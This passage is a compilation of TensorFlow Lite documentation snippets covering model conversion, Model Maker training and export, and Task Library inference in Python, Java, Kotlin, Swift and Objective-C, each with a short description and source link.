LANGUAGE: python
CODE:
```
# Read, then decode for py2 compat.
text = open(path_to_file, 'rb').read().decode(encoding='utf-8')
# length of text is the number of characters in it
print ('Length of text: {} characters'.format(len(text)))
```

----------------------------------------

TITLE: Train TensorFlow Audio Classifier Model (Python)
DESCRIPTION: Trains the audio classification model using the provided training data and hyperparameters. Validation data can optionally be provided for monitoring performance during training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_10

LANGUAGE: Python
CODE:
```
train(
    train_data, validation_data, epochs, batch_size
)
```

----------------------------------------

TITLE: Exporting Question Answer Model in Python
DESCRIPTION: Converts and exports the retrained model into various formats like TFLite, SavedModel, labels, and vocabulary files based on the specified `export_format`. The files are saved to the `export_dir` with configurable filenames.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_6

LANGUAGE: python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Installing Build Dependencies on Linux/macOS (Shell)
DESCRIPTION: Installs prerequisite packages required for building TensorFlow from source code on Linux or macOS systems. It uses `apt-get` for Debian/Ubuntu-based Linux distributions and `brew` (Homebrew) for macOS.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/java/LEGACY.md#_snippet_0

LANGUAGE: Shell
CODE:
```
# On Linux
sudo apt-get install python swig python-numpy

# On Mac OS X with homebrew
brew install swig
```

----------------------------------------

TITLE: Initializing GPT-2 Model Components with KerasNLP (Python)
DESCRIPTION: This snippet initializes the necessary components for a GPT-2 causal language model using KerasNLP's from_preset method. It loads the pre-trained tokenizer, preprocessor, and the main language model backbone, allowing for quick setup of a text generation pipeline. It requires the KerasNLP library and pre-trained "gpt2_base_en" assets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/auto_complete/overview.md#_snippet_0

LANGUAGE: python
CODE:
```
gpt2_tokenizer = keras_nlp.models.GPT2Tokenizer.from_preset("gpt2_base_en")

gpt2_preprocessor = keras_nlp.models.GPT2CausalLMPreprocessor.from_preset(
    "gpt2_base_en",
    sequence_length=256,
    add_end_token=True,
)

gpt2_lm =
keras_nlp.models.GPT2CausalLM.from_preset(
"gpt2_base_en",
preprocessor=gpt2_preprocessor
)
```

----------------------------------------

TITLE: Print Model Summary (Python)
DESCRIPTION: Prints a summary of the model's architecture, including layer names, types, and parameter counts.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_9

LANGUAGE: Python
CODE:
```
summary()
```

----------------------------------------

TITLE: Getting Model Summary in Python
DESCRIPTION: Prints a summary of the model's architecture, including layer names, output shapes, and the number of parameters. This helps in understanding the structure of the trained model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/QuestionAnswer.md#_snippet_7

LANGUAGE: python
CODE:
```
summary()
```

----------------------------------------

TITLE: Performing Bert NL Classification in Python
DESCRIPTION: Performs natural language classification on the provided input `text`. It returns a `ClassificationResult` object containing the classification results or raises `ValueError` or `RuntimeError` on failure. Requires the `text` parameter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertNLClassifier.md#_snippet_1

LANGUAGE: python
CODE:
```
classify(
    text: str
) -> <a href="../../../tflite_support/task/processor/ClassificationResult"><code>tflite_support.task.processor.ClassificationResult</code></a>
```

----------------------------------------

TITLE: Using TFLite BertQuestionAnswerer in Java (Android)
DESCRIPTION: This snippet shows how to initialize the TFLite BertQuestionAnswerer API in Java for Android by providing the model and vocabulary file paths. It then demonstrates how to call the `answer` method with context and a question to get a list of answers. Dependencies include the TFLite Support Java library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_4

LANGUAGE: java
CODE:
```
  String BERT_MODEL_FILE = "path/to/model.tflite";
  String VOCAB_FILE = "path/to/vocab.txt";
  // Create the API from a model file and vocabulary file
    BertQuestionAnswerer bertQuestionAnswerer =
        BertQuestionAnswerer.createBertQuestionAnswerer(
            ApplicationProvider.getApplicationContext(), BERT_MODEL_FILE, VOCAB_FILE);

  String CONTEXT = ...; // context of a question to be answered
  String QUESTION = ...; // question to be answered
  // ask a question
  List<QaAnswer> answers = bertQuestionAnswerer.answer(CONTEXT, QUESTION);
  // answers.get(0).text is the best answer
```

----------------------------------------

TITLE: Saving Keras JAX Model to SavedModel Format Python
DESCRIPTION: This code saves the instantiated Keras model (`jax_model`) to a directory specified by `saved_model_dir`. The `.export()` method saves the model in the TensorFlow SavedModel format, which is required for conversion to TFLite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
saved_model_dir = "resnet50_saved_model"
jax_model.export(saved_model_dir)
```

----------------------------------------

TITLE: Download MoveNet Model and Setup Pose Estimation Code
DESCRIPTION: Downloads the MoveNet Thunder TFLite model file from TensorFlow Hub and clones the TensorFlow examples repository from GitHub. It then adds the path to the pose estimation example code from the repository to the system path, allowing the import of necessary utility modules (`utils`, `data`, `ml`) to load and initialize the MoveNet model for pose detection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_2

LANGUAGE: Shell
CODE:
```
!wget -q -O movenet_thunder.tflite https://tfhub.dev/google/lite-model/movenet/singlepose/thunder/tflite/float16/4?lite-format=tflite
!git clone https://github.com/tensorflow/examples.git
```

LANGUAGE: Python
CODE:
```
pose_sample_rpi_path = os.path.join(os.getcwd(), 'examples/lite/examples/pose_estimation/raspberry_pi')
sys.path.append(pose_sample_rpi_path)

# Load MoveNet Thunder model
import utils
from data import BodyPart
from ml import Movenet
movenet = Movenet('movenet_thunder')
```

----------------------------------------

TITLE: Converting Concrete Functions to TFLite with Signatures - Python
DESCRIPTION: Shows how to convert a list of specific TensorFlow concrete functions directly to a TFLite model using TFLiteConverter.from_concrete_functions. This method allows converting specific entry points defined as functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_4

LANGUAGE: Python
CODE:
```
model = Model()

# Convert the concrete functions using TFLiteConverter
converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [model.encode.get_concrete_function(),
     model.decode.get_concrete_function()], model)
converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS,  # enable TensorFlow Lite ops.
    tf.lite.OpsSet.SELECT_TF_OPS  # enable TensorFlow ops.
]
tflite_model = converter.convert()

# Print the signatures from the converted model
interpreter = tf.lite.Interpreter(model_content=tflite_model)
signatures = interpreter.get_signature_list()
print(signatures)
```

----------------------------------------

TITLE: Clone TensorFlow Examples Repository - Bash
DESCRIPTION: Clones the entire TensorFlow examples GitHub repository to your local machine. This is the first step in getting the example code for the Android object detection app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_0

LANGUAGE: Bash
CODE:
```
git clone https://github.com/tensorflow/examples.git
```

----------------------------------------

TITLE: Converting SavedModel to TFLite with Signatures - Python
DESCRIPTION: Demonstrates saving a TensorFlow model with explicit signatures using tf.saved_model.save, then converting the SavedModel to a TFLite model using TFLiteConverter.from_saved_model, preserving the defined signatures. It also shows how to load and inspect signatures in the converted TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_2

LANGUAGE: Python
CODE:
```
model = Model()

# Save the model
SAVED_MODEL_PATH = 'content/saved_models/coding'

tf.saved_model.save(
    model, SAVED_MODEL_PATH,
    signatures={
      'encode': model.encode.get_concrete_function(),
      'decode': model.decode.get_concrete_function()
    })

# Convert the saved model using TFLiteConverter
converter = tf.lite.TFLiteConverter.from_saved_model(SAVED_MODEL_PATH)
converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS,  # enable TensorFlow Lite ops.
    tf.lite.OpsSet.SELECT_TF_OPS  # enable TensorFlow ops.
]
tflite_model = converter.convert()

# Print the signatures from the converted model
interpreter = tf.lite.Interpreter(model_content=tflite_model)
signatures = interpreter.get_signature_list()
print(signatures)
```

----------------------------------------

TITLE: Using TF Range for Loop with TF Conditional (Python)
DESCRIPTION: This corrected snippet shows the proper way to handle the previous case by converting the Python `for` loop into a TensorFlow loop using `tf.range`. When both the loop and the conditional are TensorFlow operations, AutoGraph can convert the `break` statement correctly within the TF graph, resolving the `OperatorNotAllowedInGraphError`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/common_errors.md#_snippet_3

LANGUAGE: Python
CODE:
```
for i in tf.range(3):  # TF loop
  if i > tf.constant(0):  # TF conditional
    break  # works
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with Metal Delegate - Objective-C
DESCRIPTION: Initialize the TensorFlow Lite Interpreter in Objective-C using the `TFLMetalDelegate`. Import the necessary headers (`TFLTensorFlowLite.h` and `TFLMetalDelegate.h`), create a `TFLMetalDelegate` instance, configure `TFLInterpreterOptions`, and pass the delegate to the `TFLInterpreter` initializer. Remember to handle potential errors and allocate tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_2

LANGUAGE: Objective-C
CODE:
```
// Import module when using CocoaPods with module support
@import TFLTensorFlowLite;

// Or import following headers manually
#import "tensorflow/lite/objc/apis/TFLMetalDelegate.h"
#import "tensorflow/lite/objc/apis/TFLTensorFlowLite.h"

// Initialize GPU delegate
TFLMetalDelegate* metalDelegate = [[TFLMetalDelegate alloc] init];

// Initialize interpreter with model path and GPU delegate
TFLInterpreterOptions* options = [[TFLInterpreterOptions alloc] init];
NSError* error = nil;
TFLInterpreter* interpreter = [[TFLInterpreter alloc]
                                initWithModelPath:modelPath
                                          options:options
                                        delegates:@[ metalDelegate ]
                                            error:&error];
if (error != nil) { /* Error handling... */ }

if (![interpreter allocateTensorsWithError:&error]) { /* Error handling... */ }
if (error != nil) { /* Error handling... */ }

// Run inference ...
```

----------------------------------------

TITLE: Export Model in Multiple Formats - Python (Model Maker)
DESCRIPTION: This snippet demonstrates exporting the trained model in formats other than just TFLite. It specifies a list of `ExportFormat` enums to include both the SavedModel format and a separate label file alongside the default TFLite export.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
model.export(export_dir='.', export_format=[ExportFormat.SAVED_MODEL, ExportFormat.LABEL])
```

----------------------------------------

TITLE: Loading Audio Files from Folder with AudioDataLoader (Python)
DESCRIPTION: Class method to load audio files organized in a standard folder structure where subfolders represent different audio classes. Requires an `audio_spec.BaseSpec` instance (`spec`) and the root path (`data_path`). Supports selecting specific categories, shuffling the data, and optionally caching intermediate results. Returns an `AudioDataLoader` instance containing the processed audio data (e.g., spectrograms) and labels, ready for further use.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
from_folder(
    spec, data_path, categories=None, shuffle=True, cache=False
)
```

----------------------------------------

TITLE: Applying TensorFlow Lite Hardware Delegate - Kotlin
DESCRIPTION: Implements the logic for selecting and applying the appropriate hardware delegate (GPU or NNAPI) to the model initialization options. It uses a 'when' statement to check the selected delegate type and configures the base options accordingly, including a check for device compatibility for GPU acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
when (currentDelegate) {
 DELEGATE_CPU -> {
 // Default
 }
 DELEGATE_GPU -> {
 if (CompatibilityList().isDelegateSupportedOnThisDevice) {
 baseOptionsBuilder.useGpu()
 } else {
 answererListener?.onError("GPU is not supported on this device")
 }
 }
 DELEGATE_NNAPI -> {
 baseOptionsBuilder.useNnapi()
 }
}
```

----------------------------------------

TITLE: Initializing and Running Object Detection Java
DESCRIPTION: Demonstrates how to initialize the `ObjectDetector` with options (like using the GPU delegate and setting the maximum number of results) and perform inference on an input `image` object to obtain a list of detected objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_1

LANGUAGE: java
CODE:
```
// Initialization
ObjectDetectorOptions options =
    ObjectDetectorOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setMaxResults(1)
        .build();
ObjectDetector objectDetector =
    ObjectDetector.createFromFileAndOptions(
        context, modelFile, options);

// Run inference
List<Detection> results = objectDetector.detect(image);
```

----------------------------------------

TITLE: Running NLClassifier Inference Java
DESCRIPTION: Initializes the NLClassifier using options like setting GPU delegate and specifying input/output tensor names. It then demonstrates how to perform classification on an input string and receive a list of Category results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization, use NLClassifierOptions to configure input and output tensors
NLClassifierOptions options =
    NLClassifierOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setInputTensorName(INPUT_TENSOR_NAME)
        .setOutputScoreTensorName(OUTPUT_SCORE_TENSOR_NAME)
        .build();
NLClassifier classifier =
    NLClassifier.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<Category> results = classifier.classify(input);
```

----------------------------------------

TITLE: Populating TFLite Model Buffer Metadata - Python
DESCRIPTION: This snippet shows how to pack metadata and associated files into a TFLite model that exists as a byte buffer. It initializes the `MetadataPopulator` with the model buffer, loads metadata from a file and associated files from paths, performs the population, and then retrieves the updated model buffer to be written to a file. This is useful when the model is not stored as a file initially.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_1

LANGUAGE: Python
CODE:
```
# Populating a metadata file (or a metadta buffer) and associated files to
a model buffer:
populator = MetadataPopulator.with_model_buffer(model_buf)
populator.load_metadata_file(metadata_file)
populator.load_associated_files([label.txt])
populator.populate()
# Writing the updated model buffer into a file.
updated_model_buf = populator.get_model_buffer()
with open("updated_model.tflite", "wb") as f:
  f.write(updated_model_buf)
```

----------------------------------------

TITLE: Exporting SavedModel and Labels Python
DESCRIPTION: Exports the trained model in TensorFlow's SavedModel format and also exports the associated label map. This is useful for deployment in Python environments or server-side serving. It calls the `export` method specifying multiple export formats. Requires a trained `model` object and the `mm` (Model Maker) module.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
model.export(models_path, export_format=[mm.ExportFormat.SAVED_MODEL, mm.ExportFormat.LABEL])
```

----------------------------------------

TITLE: Evaluate Trained Model Performance in Python
DESCRIPTION: This snippet evaluates the trained audio classification model's performance using the test dataset that was not used during training. The `evaluate()` method computes relevant metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
model.evaluate(test_data)
```

----------------------------------------

TITLE: Compiling TensorFlow Function with XLA for Training Python
DESCRIPTION: This defines the main training step function, `train_mnist`, decorated with `@tf.function(jit_compile=True)`. The decorator enables XLA compilation, turning the Python function and its TensorFlow operations into a high-performance compiled kernel. Inside the function, it performs a forward pass, calculates the sparse softmax cross-entropy loss, computes gradients with `tf.GradientTape`, and applies them using the optimizer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tf2xla/tutorials/jit_compile.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
@tf.function(jit_compile=True)
def train_mnist(images, labels):
    images, labels = cast(images, labels)

    with tf.GradientTape() as tape:
      predicted_labels = layer(images)
      loss = tf.reduce_mean(tf.nn.sparse_softmax_cross_entropy_with_logits(
          logits=predicted_labels, labels=labels
      ))
    layer_variables = layer.trainable_variables
    grads = tape.gradient(loss, layer_variables)
    optimizer.apply_gradients(zip(grads, layer_variables))
```

----------------------------------------

TITLE: Installing TFLite Support Package (Shell)
DESCRIPTION: Command to install the `tflite-support` Python package using pip, which is required for using the TensorFlow Lite code generator command-line tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_3

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Define Float16 Quantization Config - Python (Model Maker)
DESCRIPTION: This snippet creates a configuration object specifically for applying float16 post-training quantization to the model. This reduces model size and can speed up inference on supporting hardware at the cost of potential minor accuracy loss.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_20

LANGUAGE: python
CODE:
```
config = QuantizationConfig.for_float16()
```

----------------------------------------

TITLE: Filter TFLite Inference Timings Android Logcat ADB
DESCRIPTION: Clears the Android logcat (`adb logcat -c`) and then filters the colorized log output (`adb logcat -v color`) to find lines containing "Inference timings in us". This helps in quickly extracting detailed performance metrics for individual model runs from the benchmark output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_10

LANGUAGE: ADB Shell
CODE:
```
adb logcat -c && adb logcat -v color | grep "Inference timings in us"
```

----------------------------------------

TITLE: Writing Float TFLite Model to File Python
DESCRIPTION: Defines the file path for the standard TensorFlow Lite model within the previously created directory and writes the converted float model's byte content to this file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
tflite_model_file = tflite_models_dir/"mnist_model.tflite"
tflite_model_file.write_bytes(tflite_model)
```

----------------------------------------

TITLE: Scheduling TFLite Audio Classification Task (Kotlin)
DESCRIPTION: Configures a ScheduledThreadPoolExecutor to run the audio classification logic (classifyRunnable) periodically on a background thread. The task is scheduled to start immediately and repeat at a fixed rate defined by the interval parameter, ensuring continuous processing of audio clips for inference without blocking the main UI thread.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_9

LANGUAGE: kotlin
CODE:
```
executor = ScheduledThreadPoolExecutor(1)
executor.scheduleAtFixedRate(
  classifyRunnable,
  0,
  interval,
  TimeUnit.MILLISECONDS)
```

----------------------------------------

TITLE: Creating AudioClassifier Instance from File and Options - Kotlin
DESCRIPTION: Instantiates the `AudioClassifier` object by loading the specified TFLite model file (e.g., "yamnet.tflite") from the application's assets directory and applying the previously built options. This creates the classifier instance ready to perform inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
classifier = AudioClassifier.createFromFileAndOptions(context, "yamnet.tflite", options)
```

----------------------------------------

TITLE: Add TensorFlow Lite Play Services Dependencies - Gradle
DESCRIPTION: Adds the necessary dependencies to the Android app's `build.gradle` file to use the TensorFlow Lite Task Library for vision via Google Play services, including GPU acceleration support. This makes the required libraries available for use in the project.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_2

LANGUAGE: Gradle
CODE:
```
...
dependencies {
...
    // Tensorflow Lite dependencies
    implementation 'org.tensorflow:tensorflow-lite-task-vision-play-services:0.4.2'
    implementation 'com.google.android.gms:play-services-tflite-gpu:16.1.0'
...
}
```

----------------------------------------

TITLE: Configuring Coral Edge TPU Delegate (Python)
DESCRIPTION: This Python snippet demonstrates how to configure and enable the Coral Edge TPU delegate for a TensorFlow Lite Task Library task, using `ImageClassifier` as an example. It shows how to initialize `BaseOptions` with the model file and `use_coral=True`, and then create the task instance from these options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_4

LANGUAGE: Python
CODE:
```
# Imports
from tflite_support.task import vision
from tflite_support.task import core

# Initialize options and turn on Coral Edge TPU delegation.
base_options = core.BaseOptions(file_name=model_path, use_coral=True)
options = vision.ImageClassifierOptions(base_options=base_options)

# Create ImageClassifier from options.
classifier = vision.ImageClassifier.create_from_options(options);

# Run inference on Coral Edge TPU.
image = vision.TensorImage.create_from_file(image_path)
classification_result = classifier.classify(image)
```

----------------------------------------

TITLE: Add Task Library Vision Dependency - Gradle
DESCRIPTION: This snippet shows how to add the Gradle dependency for the TensorFlow Lite Task Library's Vision module that uses Google Play services. It is required to access vision-related TFLite APIs provided by Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_0

LANGUAGE: Groovy
CODE:
```
dependencies {
...
    implementation 'org.tensorflow:tensorflow-lite-task-vision-play-services:0.4.2'
...
}
```

----------------------------------------

TITLE: Initializing TFLite Interpreter from MappedByteBuffer Java
DESCRIPTION: Initializes a TensorFlow Lite interpreter object using a `MappedByteBuffer` containing the model data. The byte buffer must contain a valid TFLite model and remain unchanged throughout the interpreter's lifetime. It throws `IllegalArgumentException` for invalid models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_1

LANGUAGE: Java
CODE:
```
public Interpreter(@NotNull MappedByteBuffer mappedByteBuffer);
```

----------------------------------------

TITLE: Converting Keras Model RNN to TensorFlow Lite (Python)
DESCRIPTION: This snippet illustrates the conversion of a Keras model containing LSTM layers directly to TensorFlow Lite. It utilizes the TFLiteConverter.from_keras_model method, passing the Keras model object. The convert method generates the TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/rnn.md#_snippet_1

LANGUAGE: Python
CODE:
```
# build a Keras model
keras_model = build_keras_lstm(...)

# Convert the model.
converter = TFLiteConverter.from_keras_model(keras_model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Initializing TFLite Interpreter (Python)
DESCRIPTION: Shows how to initialize a TensorFlow Lite interpreter using the converted TFLite model content. This prepares the model for execution on a device. Attempting to run a model with unregistered custom operators using this interpreter will result in an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_3

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
```

----------------------------------------

TITLE: Displaying Model Summary (Python)
DESCRIPTION: Prints a summary of the fine-tuned model's layers, parameters, and structure to the console using `model.summary()`. This provides a concise overview of the model architecture after customization, which can be useful for debugging or verification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
model.summary()
```

----------------------------------------

TITLE: Creating Image Classifier with MobileNetV2 - Python
DESCRIPTION: Creates and trains an image classification model using the specified training and validation data, leveraging the MobileNetV2 architecture as the base model. This replaces the default EfficientNet-Lite0 base model with MobileNetV2. Requires training data, validation data, and the MobileNetV2 model specification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
model = image_classifier.create(train_data, model_spec=model_spec.get('mobilenet_v2'), validation_data=validation_data)
```

----------------------------------------

TITLE: Using TFLite BertQuestionAnswerer in Swift (iOS)
DESCRIPTION: This snippet shows how to initialize the TFLite BertQuestionAnswerer API in Swift for iOS by providing the model file path. It demonstrates how to call the `answer` method with context and a question to get a list of answers. Dependencies include the TFLite Support iOS library and potentially Swift bridging headers for Objective-C classes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_8

LANGUAGE: swift
CODE:
```
  static let mobileBertModelPath = "path/to/model.tflite";
  // Create the API from a model file and vocabulary file
  let mobileBertAnswerer = TFLBertQuestionAnswerer.mobilebertQuestionAnswerer(
      modelPath: mobileBertModelPath)

  static let context = ...; // context of a question to be answered
  static let question = ...; // question to be answered
  // ask a question
  let answers = mobileBertAnswerer.answer(
      context: TFLBertQuestionAnswererTest.context, question: TFLBertQuestionAnswererTest.question)
  // answers.[0].text is the best answer
```

----------------------------------------

TITLE: Load and Split Dataset Python
DESCRIPTION: Loads the audio dataset from the specified 'train' and 'test' directories using `audio_classifier.DataLoader.from_folder`, applying the configured `spec`. The training data is then split 80/20 into training and validation sets, and the data is cached in memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
train_data = audio_classifier.DataLoader.from_folder(
    spec, os.path.join(data_dir, 'train'), cache=True)
train_data, validation_data = train_data.split(0.8)
test_data = audio_classifier.DataLoader.from_folder(
    spec, os.path.join(data_dir, 'test'), cache=True)
```

----------------------------------------

TITLE: Initializing Audio Classifier in Python
DESCRIPTION: This Python snippet demonstrates how to initialize the AudioClassifier using either create_from_options with customizable settings like max_results or simply using create_from_file with the model path. It requires the tflite-support library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_6

LANGUAGE: Python
CODE:
```
# Imports
from tflite_support.task import audio
from tflite_support.task import core
from tflite_support.task import processor

# Initialization
base_options = core.BaseOptions(file_name=model_path)
classification_options = processor.ClassificationOptions(max_results=2)
options = audio.AudioClassifierOptions(base_options=base_options, classification_options=classification_options)
classifier = audio.AudioClassifier.create_from_options(options)

# Alternatively, you can create an audio classifier in the following manner:
# classifier = audio.AudioClassifier.create_from_file(model_path)
```

----------------------------------------

TITLE: Initializing ImageClassifierOptions TensorFlow Lite Python
DESCRIPTION: Initializes the `ImageClassifierOptions` class, which holds configurable settings for the TensorFlow Lite Image Classifier task. It requires `base_options` for fundamental model settings and accepts optional `classification_options` to customize classification behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifierOptions.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.vision.ImageClassifierOptions(
    base_options: <a href="../../../tflite_support/task/core/BaseOptions"><code>tflite_support.task.core.BaseOptions</code></a>,
    classification_options: <a href="../../../tflite_support/task/processor/ClassificationOptions"><code>tflite_support.task.processor.ClassificationOptions</code></a> = dataclasses.field(default_factory=_ClassificationOptions)
)
```

----------------------------------------

TITLE: Training MNIST Model TensorFlow Keras Python
DESCRIPTION: Loads the MNIST dataset, preprocesses images by normalizing pixel values, defines a simple convolutional neural network using Keras Sequential API, compiles the model with Adam optimizer and sparse categorical crossentropy loss, and trains the model for a single epoch on the training data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
# Load MNIST dataset
mnist = keras.datasets.mnist
(train_images, train_labels), (test_images, test_labels) = mnist.load_data()

# Normalize the input image so that each pixel value is between 0 to 1.
train_images = train_images / 255.0
test_images = test_images / 255.0

# Define the model architecture
model = keras.Sequential([
  keras.layers.InputLayer(input_shape=(28, 28)),
  keras.layers.Reshape(target_shape=(28, 28, 1)),
  keras.layers.Conv2D(filters=12, kernel_size=(3, 3), activation=tf.nn.relu),
  keras.layers.MaxPooling2D(pool_size=(2, 2)),
  keras.layers.Flatten(),
  keras.layers.Dense(10)
])

# Train the digit classification model
model.compile(optimizer='adam',
              loss=keras.losses.SparseCategoricalCrossentropy(from_logits=True),
              metrics=['accuracy'])
model.fit(
  train_images,
  train_labels,
  epochs=1,
  validation_data=(test_images, test_labels)
)
```

----------------------------------------

TITLE: Initialize and Run Inference with BertQuestionAnswerer (Python)
DESCRIPTION: This Python snippet shows how to import the `BertQuestionAnswerer` class, initialize an instance from a TFLite model file path, and then run inference by calling the `answer` method with the context and question strings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_6

LANGUAGE: python
CODE:
```
# Imports
from tflite_support.task import text

# Initialization
answerer = text.BertQuestionAnswerer.create_from_file(model_path);

# Run inference
bert_qa_result = answerer.answer(context, question);
```

----------------------------------------

TITLE: Invoking TFLite Model Inference in Python
DESCRIPTION: Executes the inference operations defined in the TFLite model. Before calling this, input tensors must be sized (`resize_tensor_input`), tensors allocated (`allocate_tensors`), and input values set (`set_tensor`). It releases the GIL during computation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_13

LANGUAGE: python
CODE:
```
invoke()
```

----------------------------------------

TITLE: Running TFLite Inference in Swift
DESCRIPTION: Demonstrates the complete process of loading a TFLite model from a file, initializing an interpreter, allocating tensors, preparing input data, performing inference, and retrieving the output data in Swift. It includes placeholders for input data preparation and error handling.
